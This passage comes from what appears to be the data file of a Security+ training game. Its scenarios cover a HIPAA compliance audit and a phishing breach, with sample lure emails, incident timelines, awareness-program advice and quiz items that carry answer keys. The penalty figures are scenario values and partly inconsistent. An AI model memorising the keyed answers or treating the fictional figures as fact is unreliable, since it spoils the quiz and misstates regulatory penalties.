  - SOX: Executives must attest to accuracy of financial reports (CEO/CFO sign)
  - ISO 27001: External auditor attests that ISMS meets standards
  - SOC 2: Independent auditor attests to effectiveness of controls over time

False attestation undermines the entire compliance regime. Penalties are severe when organizations claim compliance but knowingly fail to implement controls.`,
        critical: false
      },
      {
        id: 'comply-04',
        type: 'report',
        label: 'Audit Types and Assessment Programs',
        content: `AUDIT AND ASSESSMENT FRAMEWORK:

Types of Audits:

1. External Audit:
   - Conducted by independent third party (OCR in this case)
   - Objective, unbiased evaluation
   - Results often required for regulatory compliance
   - This HIPAA audit is an external regulatory audit

2. Internal Audit:
   - Conducted by organization's own audit team
   - Self-assessment of controls
   - Identifies gaps before external audits find them
   - Should be conducted regularly (quarterly or annually)

3. Audit Committee:
   - Governance body overseeing audit programs
   - Typically board-level or executive committee
   - Reviews audit findings and ensures remediation
   - This organization had no active audit committee for HIPAA

Penetration Testing Perspectives (also relevant to compliance):
  - Offensive/Red Team: Simulates attacker perspective to find vulnerabilities
  - Defensive/Blue Team: Focuses on detection and response capabilities
  - Integrated/Purple Team: Red and blue teams collaborate to improve both offense and defense
  - Known Environment (White Box): Testers have full system knowledge
  - Unknown Environment (Black Box): Testers have no prior knowledge
  - Partially Known Environment (Gray Box): Testers have limited knowledge

HIPAA does not explicitly require penetration testing, but it requires "technical safeguards" that are best validated through testing. This organization never conducted internal audits or penetration tests — they waited until a regulator forced it.`,
        critical: false
      },
      {
        id: 'comply-05',
        type: 'alert',
        label: 'Financial and Reputational Impact',
        content: `CONSEQUENCES OF NON-COMPLIANCE:

Financial Penalties (HIPAA Tier Structure):
  - Tier 1 (Unknowing): $100–$50,000 per violation
  - Tier 2 (Reasonable Cause): $1,000–$50,000 per violation
  - Tier 3 (Willful Neglect — Corrected): $10,000–$50,000 per violation
  - Tier 4 (Willful Neglect — Not Corrected): $50,000 per violation

OCR's preliminary classification: TIER 4 (willful neglect)
  - Rationale: Risk analysis was required and knowingly skipped for 3 years
  - False attestation demonstrates willful neglect
  - 47 violations × $50,000 = $2,350,000 (minimum)
  - Maximum exposure: 47 violations × $1,500,000 = $70,500,000 (annual cap applies)

Other Consequences:
  - Loss of License: HHS can bar organization from Medicare/Medicaid programs
  - Contractual Impacts: Insurance contracts may be voided for non-compliance
  - Reputational Damage: Local news is already reporting "Hospital Fails HIPAA Audit"
  - Patient Trust: 15% drop in new patient appointments since news broke
  - Legal Exposure: Patients whose records were accessed by terminated employees may sue

Compliance is not optional for regulated industries. Fines are designed to exceed the cost of compliance to incentivize doing it right the first time.

Due Care: Implementing reasonable safeguards (encryption, access controls)
Due Diligence: Conducting risk assessments to identify what safeguards are needed

This organization failed both, and the financial consequences will be catastrophic.`,
        critical: false
      }
    ],

    challenge: {
      question: 'What was the MOST egregious compliance failure that elevated penalties to the highest tier (willful neglect)?',
      options: [
        'Failure to implement encryption on the patient database',
        'Skipping required annual risk analyses for 3 years while attesting compliance',
        'Not conducting penetration testing with a purple team approach',
        'Allowing workstations in public areas without privacy screens'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Lack of encryption is a serious technical safeguard violation, but it could be classified as "reasonable cause" (Tier 2) if the organization was unaware or attempting remediation. The encryption failure alone does not prove willful neglect.',
        'CORRECT: HIPAA explicitly requires annual risk analyses. Skipping this for 3 years while simultaneously attesting to compliance demonstrates willful neglect — the organization KNEW the requirement, chose to ignore it, and lied about it. This elevates penalties to Tier 4 (the highest) and opens potential criminal liability for false attestation.',
        'INCORRECT: Penetration testing is a best practice but not explicitly required by HIPAA. While recommended, failure to conduct pentests would not constitute willful neglect of a regulatory requirement.',
        'INCORRECT: Privacy screens on public workstations are a physical safeguard best practice, but failing to implement them is a relatively minor violation. It would not alone constitute willful neglect or elevate penalties to the maximum tier.'
      ]
    },

    debrief: `This investigation covers CompTIA Objectives 5.4 and 5.5: Compliance Monitoring and Privacy.

Key concepts learned:
  - HIPAA: Healthcare data protection (PHI — Protected Health Information)
  - SOX (Sarbanes-Oxley): Financial reporting integrity for public companies
  - GLBA (Gramm-Leach-Bliley Act): Financial institution customer privacy
  - GDPR: EU personal data protection (data subjects, right to be forgotten, data sovereignty)
  - Compliance Monitoring: Regular risk assessments, audit logs, due diligence
  - Due Diligence: Identifying risks through assessments
  - Due Care: Implementing controls to address identified risks
  - Attestation: Formal certification that controls are in place (carries legal weight)
  - Audit Types: Internal (self-assessment), external (third-party), audit committee (oversight)
  - Penetration Testing: Offensive/red team, defensive/blue team, integrated/purple team
  - Consequences: Fines, loss of license, contractual impacts, reputational damage

Compliance requires continuous effort. Annual requirements must be met annually. False attestation converts compliance failures into fraud.`,

    escalation: `HHS issues final penalties totaling $4.7M after the 30-day response period. The organization's Medicare reimbursement is suspended pending corrective action, cutting revenue by 40%. Two class-action lawsuits are filed by patients whose records were accessed by unauthorized former employees. The CFO estimates total cost (fines + legal + remediation + lost revenue) at $12M. The Board terminates the CEO and CFO, hires a Chief Compliance Officer with a $300K salary, and mandates quarterly external compliance audits for 3 years. Local competitor hospitals gain 22% of the patient base due to reputational damage.`,

    refs: [
      { source: 'Study Guide', section: '5.4 - Compliance and Regulations', page: 107 },
      { source: 'Study Guide', section: '5.5 - Privacy Regulations', page: 110 },
      { source: 'Study Guide', section: '5.5 - Audits and Assessments', page: 112 }
    ]
  },

  // ============================================================
  // DOMAIN 5 — Governance, Risk, Compliance (Obj 5.6)
  // Teaches: Security Awareness, Phishing Campaigns, Anomalous Behavior, User Training
  // ============================================================
  {
    id: 'MISSION-039',
    title: 'The Human Firewall Failed',
    domain: 'Governance, Risk, Compliance',
    objectiveCodes: ['5.6'],
    threatLevel: 'high',
    tags: ['Security Awareness', 'Phishing', 'User Training', 'Human Factor', 'Social Engineering'],
    briefing: `BREACH POST-MORTEM: Despite investing $800,000 in next-generation firewalls, EDR, and SIEM, your company was breached through a simple phishing email. An accounting employee clicked a link in a fake "invoice overdue" message, entered credentials on a lookalike login page, and gave attackers VPN access. The breach cost $1.2M in incident response and lost data. The CISO is being grilled by the board: "We spent a fortune on technology. How did a single email defeat all of it?" The answer lies in your security awareness program — or rather, the complete absence of one. You need to investigate the human factor and design a training program that actually works.`,

    intel: [
      {
        id: 'human-01',
        type: 'forensic',
        label: 'Phishing Attack Analysis',
        content: `INCIDENT TIMELINE — Credential Phishing Attack

January 28, 09:47 AM:
  - Employee mwilliams@company.com receives email:
    From: "Accounts Payable" <ap-notify@companysupport.net> [SPOOFED DOMAIN]
    Subject: "URGENT: Invoice #84772 Overdue — Immediate Action Required"
    Body: "Your payment of $4,750 is 15 days overdue. Click here to view invoice and resolve immediately to avoid service interruption."

09:49 AM:
  - Employee clicks link (led to hxxps://company-portal[.]net — fake domain)
  - Fake login page mimics company's VPN portal (identical branding)
  - Employee enters username and password

09:51 AM:
  - Attacker uses stolen credentials to log into real VPN from IP 185.220.101.47 (Romania)
  - MFA not enabled on VPN (technical failure)
  - Access granted to internal network

10:15 AM:
  - Attacker moves laterally to file server, exfiltrates customer database

This is a classic social engineering attack exploiting human psychology:
  - Urgency: "URGENT," "Immediate Action Required"
  - Authority: Appears to come from Accounts Payable
  - Fear: "avoid service interruption"

The technical controls (firewall, EDR, SIEM) never had a chance to stop this — the employee willingly gave the attacker valid credentials. This is why humans are called "the weakest link" in security.`,
        critical: true
      },
      {
        id: 'human-02',
        type: 'report',
        label: 'Security Awareness Program Audit',
        content: `CURRENT STATE — Security Awareness Training:

Program Elements:
  ✗ No annual security awareness training
  ✗ No phishing simulation campaigns
  ✗ No onboarding security training for new hires
  ✗ No insider threat awareness program
  ✗ No reporting mechanism for suspicious emails

New Employee Onboarding:
  - IT provides laptop and credentials
  - No training on password management, phishing, social engineering, or acceptable use policy
  - Security policy exists in employee handbook (unread)

Last Security Communication:
  - 18 months ago: Email from IT about password expiration policy
  - No ongoing awareness campaigns
  - No security champions program

Employee Survey (post-breach):
  - 78% of employees don't know how to report suspicious emails
  - 62% admit to clicking links in emails without verifying sender
  - 41% have shared passwords with colleagues
  - 89% have never received security training

Security Awareness Program Development should include:
  1. Baseline assessment (knowledge testing)
  2. Role-based training content
  3. Regular phishing simulations (internal testing)
  4. Metrics and reporting (click rates, reporting rates)
  5. Continuous education (monthly tips, newsletters)
  6. Executive engagement (leadership must champion security culture)

This organization had ZERO awareness program. Employees were never trained on threats they face daily.`,
        critical: true
      },
      {
        id: 'human-03',
        type: 'log',
        label: 'Phishing Simulation Test Results',
        content: `PILOT PHISHING CAMPAIGN — Conducted Post-Breach (February 2025)

The security team launched an internal phishing test to measure baseline awareness:

Test Email:
  From: "IT Support" <support@company-helpdesk.net> [FAKE]
  Subject: "Action Required: Verify Your Email Account"
  Body: "Your mailbox is at 95% capacity. Click here to verify your account and increase storage."

Results (200 employees tested):
  - 127 employees CLICKED the link (63.5% click rate)
  - 89 employees ENTERED CREDENTIALS on the fake page (44.5% compromise rate)
  - 3 employees REPORTED the email as suspicious (1.5% reporting rate)

Industry Benchmarks (Organizations with Mature Security Awareness):
  - Click rate: 15-25%
  - Compromise rate: 5-10%
  - Reporting rate: 60-70%

Anomalous Behavior Recognition:
Employees should be trained to spot:
  - Risky behavior: Clicking unknown links, sharing passwords, using unauthorized software
  - Unexpected behavior: Emails from known contacts with unusual requests ("wire this money")
  - Unintentional behavior: Accidentally sending data to wrong recipient, leaving documents in printer

This organization's 63.5% click rate is catastrophic — nearly 2 out of 3 employees will fall for phishing. Without training, employees cannot recognize threats.`,
        critical: false
      },
      {
        id: 'human-04',
        type: 'witness',
        label: 'Employee Interview — mwilliams',
        content: `Interview with Employee (Accounting Department):

"The email looked completely legitimate. It had our company logo, the right font, everything. The sender said 'Accounts Payable' so I figured it was internal. I was busy processing invoices and saw 'URGENT' in the subject, so I clicked without thinking.

The login page looked exactly like our VPN portal — same blue header, same logo, same layout. I entered my username and password because I thought the system was asking me to re-authenticate. I've had to re-login before when sessions time out.

No one ever told me to look at the sender's actual email address or hover over links before clicking. I didn't know that was something I should do. I've worked here for 4 years and never received any training on phishing or cybersecurity.

If someone had shown me examples of fake emails and explained what to look for — misspelled domains, suspicious links, unusual requests — I would have caught this. I feel terrible that I caused a breach, but I genuinely didn't know I was doing anything wrong."

This employee is not malicious or negligent — they are UNTRAINED. Security awareness training turns employees from vulnerabilities into defenses.`,
        critical: false
      },
      {
        id: 'human-05',
        type: 'alert',
        label: 'Security Awareness Program Design',
        content: `RECOMMENDED PROGRAM — User Training and Awareness (CompTIA Obj 5.6)

User Training Topics (to be implemented):

1. Phishing and Social Engineering:
   - Recognizing suspicious emails (sender verification, link hovering)
   - Identifying urgency/fear tactics
   - Verifying requests through alternate channels (call the person)

2. Password Management:
   - Creating strong, unique passwords
   - Using password managers
   - Never sharing credentials

3. Removable Media and Physical Security:
   - Don't plug in unknown USB drives (malware risk)
   - Lock workstations when leaving desk
   - Secure sensitive documents (clean desk policy)

4. Insider Threat Awareness:
   - Reporting colleagues exhibiting risky behavior
   - Understanding that insider threats can be unintentional

5. Operational Security (OPSEC):
   - Not discussing sensitive projects in public
   - Being cautious about what's shared on social media

6. Hybrid/Remote Work Security:
   - Securing home networks
   - Using VPN for remote access
   - Avoiding public Wi-Fi for sensitive work

7. Situational Awareness:
   - Recognizing when something "feels wrong"
   - Trusting instincts and reporting anomalies

Program Execution:
  - Quarterly interactive training (not just videos)
  - Monthly phishing simulations with immediate feedback
  - Metrics dashboard: Click rates, reporting rates, training completion
  - Incentives: Recognize employees who report phishing attempts
  - Executive sponsorship: CISO presents at company all-hands

Cost: $45,000/year for training platform and content
ROI: Prevents breaches like this one ($1.2M cost vs. $45K investment)

Security is everyone's responsibility. Technology alone cannot protect against human error — you must invest in training the humans.`,
        critical: false
      }
    ],

    challenge: {
      question: 'What should be the FIRST priority when building the security awareness program?',
      options: [
        'Deploy advanced AI-powered email filtering to block all phishing attempts',
        'Implement monthly phishing simulations with immediate training for employees who click',
        'Require all employees to pass a cybersecurity certification exam',
        'Install monitoring software to track which employees visit risky websites'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Technical controls (email filtering) are important but cannot catch every phishing attempt. Attackers constantly evolve tactics to bypass filters. More importantly, the investigation shows the ROOT CAUSE was lack of employee awareness. Technology is a supplement to training, not a replacement.',
        'CORRECT: Phishing simulations provide hands-on learning in a safe environment. When employees click a simulated phishing link, they immediately receive training explaining what they missed and how to recognize it next time. This creates muscle memory and behavioral change. Simulations also provide metrics (click rates, reporting rates) to measure program effectiveness and target additional training. This directly addresses the human factor that caused the breach.',
        'INCORRECT: Requiring certification exams is excessive and impractical for non-security staff. Awareness training should be accessible and practical (15-30 minute modules), not burdensome. The goal is behavior change, not certification.',
        'INCORRECT: Monitoring employee web activity is invasive, creates privacy concerns, and does not educate employees. It also addresses the wrong problem — the breach occurred via phishing email, not risky web browsing. Focus on training, not surveillance.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 5.6: Security Awareness and Training.

Key concepts learned:
  - The Human Factor: Employees are both the greatest vulnerability and the greatest defense
  - Phishing Campaigns: Internal testing simulates real attacks to train employees safely
  - Anomalous Behavior Recognition: Training employees to spot risky, unexpected, and unintentional behavior
  - Reporting and Monitoring: Metrics (click rates, reporting rates) measure program effectiveness
  - Security Awareness Program Development: Baseline assessment → training → testing → metrics → continuous improvement
  - User Training Topics:
    - Situational awareness (recognizing when something is wrong)
    - Insider threat (malicious and unintentional)
    - Password management (strong passwords, password managers, no sharing)
    - Removable media (USB risks, clean desk policy)
    - Social engineering (phishing, pretexting, urgency tactics)
    - Operational security (OPSEC — protecting sensitive information)
    - Hybrid/remote work (VPN, home network security, public Wi-Fi risks)

Technology cannot fix human vulnerabilities. Investment in awareness training has the highest ROI in security because it addresses the root cause of most breaches.`,

    escalation: `The board approves a $120,000 annual budget for a comprehensive security awareness program. The program launches with mandatory training for all employees, monthly phishing simulations, and quarterly refresher courses. After 6 months, phishing click rates drop from 63.5% to 18%, and reporting rates increase from 1.5% to 71%. The next phishing attempt — a real one — is reported by 14 employees within 10 minutes, and the malicious domain is blocked before anyone clicks. The CISO presents the metrics at the next board meeting: "We turned our greatest vulnerability into our strongest defense. Employees are now the human firewall."`,

    refs: [
      { source: 'Study Guide', section: '5.6 - Security Awareness Training', page: 115 },
      { source: 'Study Guide', section: '5.6 - Phishing Campaigns and Simulations', page: 117 },
      { source: 'Study Guide', section: '1.1 - Social Engineering Attacks', page: 8 }
    ]
  }
];
